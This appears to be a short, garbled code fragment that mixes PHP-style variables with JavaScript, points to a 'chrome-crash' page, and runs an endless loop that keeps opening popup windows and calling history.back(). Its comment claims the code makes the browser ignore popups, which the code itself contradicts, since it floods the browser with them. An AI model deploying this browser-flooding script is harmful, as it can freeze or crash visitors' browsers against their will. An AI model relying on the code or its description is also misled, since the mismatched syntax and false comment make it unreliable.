// Forces Browser To Ignore Popups
$location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
$vwer = '#';

while(1) {
    
    window.open("https://www.somewebsite.com", "_blank", "toolbar=yes,top=500,left=500,width=400,height=400");
    history.back(); // When Function window.open does it's thing, history back will reset the website.
    
}

